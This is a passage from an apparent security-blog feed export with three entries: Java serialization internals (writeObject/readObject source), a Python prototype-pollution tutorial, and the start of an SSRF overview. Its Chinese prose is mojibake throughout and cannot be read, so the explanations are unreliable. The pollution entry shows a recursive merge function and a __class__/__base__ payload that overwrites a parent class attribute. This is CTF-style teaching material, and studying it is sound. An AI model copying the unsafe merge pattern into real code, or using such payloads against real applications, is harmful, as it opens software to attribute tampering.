descriptor */</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> hasData;</span><br><span class="line">    ClassDataSlot(ObjectStreamClass desc, <span class="type">boolean</span> hasData) &#123;</span><br><span class="line">        <span class="built_in">this</span>.desc = desc;</span><br><span class="line">        <span class="built_in">this</span>.hasData = hasData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â‘¡ å¼€å§‹éå†è¿”å›çš„æ•°ç»„ï¼ŒhasWriteObjectMethod è¡¨ç¤ºçš„æ˜¯è¦åºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡æ˜¯å¦æœ‰ writeObject è¿™ä¸ª private æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å¹¶ä¸æ˜¯ä»»ä½•æ¥å£çš„æ–¹æ³•ï¼Œè€Œæ˜¯æˆ‘ä»¬æ‰‹åŠ¨å†™çš„</p><p><strong>æ³¨æ„ï¼šå…¶å®è¿™ä¸ªè¿‡ç¨‹ä¸åƒå®ç° Externalizable æ¥å£é‚£æ ·ï¼Œè‡ªå·±å®Œå…¨å»è‡ªå®šä¹‰åºåˆ—åŒ–æ•°æ®</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">//æ‰§è¡Œ JVM é»˜è®¤çš„åºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    <span class="comment">//æ‰‹åŠ¨åºåˆ—åŒ– arr  å‰é¢30ä¸ªå…ƒç´ </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">        s.writeObject(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â‘¢ defaultWriteFields è¿™ä¸ªæ–¹æ³•å°±æ˜¯ JVM è‡ªåŠ¨å¸®æˆ‘ä»¬åºåˆ—åŒ–äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line"> </span><br><span class="line">    desc.checkDefaultSerialize();</span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);</span><br><span class="line">    <span class="comment">//â‘ </span></span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    desc.getObjFieldValues(obj, objVals);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//â‘¡</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.push(</span><br><span class="line">                <span class="string">&quot;field (class \&quot;&quot;</span> + desc.getName() + <span class="string">&quot;\&quot;, name: \&quot;&quot;</span> +</span><br><span class="line">                fields[numPrimFields + i].getName() + <span class="string">&quot;\&quot;, type: \&quot;&quot;</span> +</span><br><span class="line">                fields[numPrimFields + i].getType() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeObject0(objVals[i],</span><br><span class="line">                         fields[numPrimFields + i].isUnshared());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸¤æ­¥</p><ul><li>â‘  å†™å…¥åŸºæœ¬æ•°æ®ç±»å‹çš„æ•°æ®</li><li>â‘¡å†™å…¥å¼•ç”¨æ•°æ®ç±»å‹çš„æ•°æ®ï¼Œè¿™é‡Œæœ€ç»ˆåˆè°ƒç”¨åˆ°äº† <code>writeObject0()</code> æ–¹æ³•ï¼Œè¯»è€…å¯ä»¥è¿”å›åˆ°ä¸Šé¢å»çœ‹çœ‹å…·ä½“çš„å®ç°</li></ul><h2 id="readObject-åŸç†åˆ†æ"><a href="#readObject-åŸç†åˆ†æ" class="headerlink" title="readObject åŸç†åˆ†æ"></a>readObject åŸç†åˆ†æ</h2><p>ä»æµä¸­è¯»å–ç±»çš„æè¿°ä¿¡æ¯ <code>ObjectStreamClass</code> å®ä¾‹ï¼Œé€šè¿‡è¿™ä¸ªå¯¹è±¡å°±å¯ä»¥åˆ›å»ºå‡ºåºåˆ—åŒ–çš„å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> readClassDesc(<span class="literal">false</span>);</span><br><span class="line">...</span><br><span class="line">  Object obj;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">//åˆ›å»ºå¯¹åº”ååºåˆ—åŒ–çš„å¯¹è±¡</span></span><br><span class="line">    obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">        desc.forClass().getName(),</span><br><span class="line">        <span class="string">&quot;unable to create instance&quot;</span>).initCause(ex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»å–è¯¥å¯¹è±¡åŠå…¶å¯¹è±¡çš„çˆ¶ç±»çš„ <code>ObjectStreamClass</code>ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br></pre></td></tr></table></figure><p>ç„¶åéå†å¾—åˆ°æ¯ä¸€ä¸ª <code>ObjectStreamClass</code> å¯¹è±¡ï¼Œå°†å¯¹åº”çš„å±æ€§å€¼èµ‹å€¼ç»™éœ€è¦ååºåˆ—åŒ–çš„å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultReadFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    bin.readFully(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        desc.setPrimFieldValues(obj, primVals);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">objHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">    <span class="comment">//ä» ObjectStreamClass ä¸­å¾—åˆ°å¯¹è±¡çš„æ‰€æœ‰ Field ä¿¡æ¯</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[numPrimFields + i];</span><br><span class="line">        objVals[i] = readObject0(f.isUnshared());</span><br><span class="line">        <span class="keyword">if</span> (f.getField() != <span class="literal">null</span>) &#123;</span><br><span class="line">            handles.markDependency(objHandle, passHandle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">//å°†æ•°æ®ä¿å­˜åˆ°å¯¹è±¡ä¸­å»</span></span><br><span class="line">        desc.setObjFieldValues(obj, objVals);</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = objHandle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2023/08/06/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/08/06/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“</h1><blockquote><p>Python ä¸­çš„åŸå‹é“¾æ±¡æŸ“ï¼ˆPrototype Pollutionï¼‰æ˜¯æŒ‡é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹é“¾ä¸­çš„å±æ€§ï¼Œå¯¹ç¨‹åºçš„è¡Œä¸ºäº§ç”Ÿæ„å¤–å½±å“æˆ–åˆ©ç”¨æ¼æ´è¿›è¡Œæ”»å‡»çš„ä¸€ç§æŠ€æœ¯ã€‚<br>åœ¨ Pythonä¸­ï¼Œå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•å¯ä»¥é€šè¿‡åŸå‹é“¾ç»§æ‰¿æ¥è·å–ã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåŸå‹ï¼ŒåŸå‹ä¸Šå®šä¹‰äº†å¯¹è±¡å¯ä»¥è®¿é—®çš„å±æ€§å’Œæ–¹æ³•ã€‚å½“å¯¹è±¡è®¿é—®å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œä¼šå…ˆåœ¨è‡ªèº«æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šå»åŸå‹é“¾ä¸Šçš„ä¸Šçº§å¯¹è±¡ä¸­æŸ¥æ‰¾ï¼ŒåŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„æ€è·¯æ˜¯é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹é“¾ä¸­çš„å±æ€§ï¼Œä½¿å¾—ç¨‹åºåœ¨è®¿é—®å±æ€§æˆ–æ–¹æ³•æ—¶å¾—åˆ°ä¸ç¬¦åˆé¢„æœŸçš„ç»“æœã€‚å¸¸è§çš„åŸå‹é“¾æ±¡æŸ“æ”»å‡»åŒ…æ‹¬ä¿®æ”¹å†…ç½®å¯¹è±¡çš„åŸå‹ã€ä¿®æ”¹å…¨å±€å¯¹è±¡çš„åŸå‹ç­‰</p></blockquote><h1 id="æ±¡æŸ“æ¡ä»¶"><a href="#æ±¡æŸ“æ¡ä»¶" class="headerlink" title="æ±¡æŸ“æ¡ä»¶"></a>æ±¡æŸ“æ¡ä»¶</h1><p>å’ŒjsåŸå‹é“¾æ±¡æŸ“å·®ä¸å¤šï¼ŒåŸå‹é“¾æ±¡æŸ“éœ€è¦mergeåˆå¹¶å‡½æ•°ï¼Œé€šè¿‡é€’å½’åˆå¹¶æ¥ä¿®æ”¹çˆ¶çº§å±æ€§ï¼ŒCTFä¸­å¸¸è§çš„mergeå‡½æ•°å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):  <span class="comment">#srcä¸ºåŸå­—å…¸ï¼Œdstä¸ºç›®æ ‡å­—å…¸</span></span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):  <span class="comment">#é”®å€¼å¯¹å­—å…¸å½¢å¼</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))  <span class="comment">#é€’å½’åˆ°å­—å…¸æœ€åä¸€å±‚</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:  <span class="comment">#classå½¢å¼</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))  <span class="comment">#é€’å½’åˆ°æœ€ç»ˆçš„çˆ¶ç±»</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><h1 id="æ±¡æŸ“è¿‡ç¨‹"><a href="#æ±¡æŸ“è¿‡ç¨‹" class="headerlink" title="æ±¡æŸ“è¿‡ç¨‹"></a>æ±¡æŸ“è¿‡ç¨‹</h1><p>æ„Ÿè§‰å’Œä¹‹å‰å­¦çš„flaskçš„æ¨¡æ¿æ³¨å…¥è¿‡ç¨‹å·®ä¸å¤šï¼Œéƒ½æ˜¯é€šè¿‡å±æ€§å’Œæ–¹æ³•çš„ä¸€å±‚å±‚è°ƒç”¨ï¼Œä»è€Œå®ç°å±æ€§çš„ä¿®æ”¹</p><p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure><h2 id="è¿‡ç¨‹åˆ†æ"><a href="#è¿‡ç¨‹åˆ†æ" class="headerlink" title="è¿‡ç¨‹åˆ†æ"></a>è¿‡ç¨‹åˆ†æ</h2><p>æ‰§è¡Œ<code>merge</code>å‡½æ•°åï¼Œå› ä¸º<code>instance</code>æ˜¯å¯¹è±¡ç±»å‹ï¼Œå¹¶ä¸”å«æœ‰<code>__class__</code>é»˜è®¤å±æ€§ï¼Œå¹¶ä¸”<code>v</code>ä¹Ÿä¸ºå­—å…¸æ ¼å¼ï¼Œæ•…æ‰§è¡Œè¿™æ¡åˆ¤æ–­è¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span></span><br><span class="line">merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">src=&#123;</span></span><br><span class="line"><span class="string">    &quot;__class__&quot; : &#123;</span></span><br><span class="line"><span class="string">        &quot;__base__&quot; : &#123;</span></span><br><span class="line"><span class="string">            &quot;secret&quot; : &quot;world&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">dst=instance()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€è¿›è¡Œç¬¬ä¸€æ¬¡é€’å½’ï¼Œæ‰§è¡Œè¯­å¥<code>merge(v, getattr(dst, k))</code>ï¼Œæ­¤æ—¶åˆå¹¶ç›®æ ‡é€šè¿‡<code>__class__</code>å±æ€§æ¢æˆäº†instanceå¯¹è±¡çš„æ‰€å±çš„ç±»<code>son_b</code>ï¼Œç„¶åå†æ¬¡é€šè¿‡ä¸€ä¸‹åˆ¤æ–­è¯­å¥è¿›è¡Œç¬¬äºŒæ¬¡é€’å½’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">src=&#123;</span></span><br><span class="line"><span class="string">        &quot;__base__&quot; : &#123;</span></span><br><span class="line"><span class="string">            &quot;secret&quot; : &quot;world&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">dst=son_b()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ¬¡é€’å½’ä¹‹åï¼Œæ‰§è¡Œè¯­å¥<code>merge(v, getattr(dst, k))</code>ï¼Œæ­¤æ—¶åˆå¹¶ç›®æ ‡é€šè¿‡<code>__base__</code>å±æ€§æ¢æˆäº†<code>son_b</code>ç±»çš„æ‰€å±çš„ç›´æ¥çˆ¶ç±»<code>father</code>ï¼Œç„¶åè¿›è¡Œç¬¬ä¸‰æ¬¡é€’å½’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">src=&#123;&quot;secret&quot; : &quot;world&quot;&#125;</span></span><br><span class="line"><span class="string">dst=father()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ¬¡é€’å½’æ—¶ï¼Œ<code>type(v) == dict</code>ä¸º<code>FALSE</code>ï¼Œé€’å½’ç»“æŸï¼Œæ­¤<code>æ—¶v=&quot;world&quot;</code>,ä¸å†æ˜¯å­—å…¸ç±»å‹ï¼Œç„¶åæ‰§è¡Œè¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>é‡ç½®<code>fatherç±»</code>ä¸­çš„<code>secret</code>å±æ€§çš„å€¼ä¸º<code>world</code>ï¼Œåˆ°æ­¤ç®€å•çš„é“¾æ±¡æŸ“å·²ç»å®Œæˆ</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2023/08/05/SSRF/"/>
      <url>/2023/08/05/SSRF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><h2 id="ç®€å•äº†è§£"><a href="#ç®€å•äº†è§£" class="headerlink" title="ç®€å•äº†è§£"></a>ç®€å•äº†è§£</h2><p>SSRF (Server-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„å®‰å…¨æ¼æ´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…ç½‘ç³»ç»Ÿï¼Œä¹Ÿæ­£å› ä¸ºè¯·æ±‚æ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥æœåŠ¡ç«¯èƒ½è¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œä¸å¤–ç½‘éš”ç»çš„å†…éƒ¨ç³»ç»Ÿã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åˆ©ç”¨ä¸€ä¸ªç½‘ç»œè¯·æ±‚çš„æœåŠ¡ï¼Œå½“ä½œè·³æ¿è¿›è¡Œæ”»å‡»ã€‚</p><p>æ”»å‡»è€…åˆ©ç”¨äº†å¯è®¿é—®WebæœåŠ¡å™¨ï¼ˆAï¼‰çš„ç‰¹å®šåŠŸèƒ½ æ„é€ æ¶æ„payloadï¼›æ”»å‡»è€…åœ¨è®¿é—®Aæ—¶ï¼Œåˆ©ç”¨Açš„ç‰¹å®šåŠŸèƒ½æ„é€ ç‰¹æ®Špayloadï¼Œç”±Aå‘èµ·å¯¹å†…éƒ¨ç½‘ç»œä¸­ç³»ç»ŸBï¼ˆå†…ç½‘éš”ç¦»ï¼Œå¤–éƒ¨ä¸å¯è®¿é—®ï¼‰çš„è¯·æ±‚ï¼Œä»è€Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚æ­¤æ—¶Aè¢«ä½œä¸ºä¸­é—´äººï¼ˆè·³æ¿ï¼‰è¿›è¡Œåˆ©ç”¨ã€‚</p><p>SSRFæ¼æ´çš„å½¢æˆå¤§å¤šæ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ 